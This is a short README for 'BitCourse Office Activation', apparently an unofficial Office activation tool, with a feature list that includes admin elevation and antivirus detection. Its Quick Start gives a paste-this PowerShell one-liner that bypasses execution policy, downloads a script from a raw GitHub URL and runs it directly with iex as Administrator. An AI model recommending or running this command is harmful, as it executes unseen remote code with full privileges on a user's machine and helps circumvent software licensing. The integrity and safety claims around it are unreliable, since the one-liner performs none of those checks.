# BitCourse Office Activation

A secure PowerShell launcher for the BitCourse Office Activation script with integrity verification and antivirus detection.

## Features

- ✅ **Secure Download**: Downloads the activation script from GitHub with multiple fallback URLs
- ✅ **Integrity Verification**: SHA256 hash verification to ensure script authenticity
- ✅ **Antivirus Detection**: Detects 3rd party antivirus that might interfere
- ✅ **Admin Elevation**: Automatically requests admin privileges
- ✅ **Automatic Cleanup**: Removes temporary files after execution
- ✅ **Error Handling**: Comprehensive error checking and troubleshooting

## Usage

### Quick Start

Open PowerShell as Administrator and run:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bitcourseoffice/activation/main/BitCourse-Launcher.ps1')"
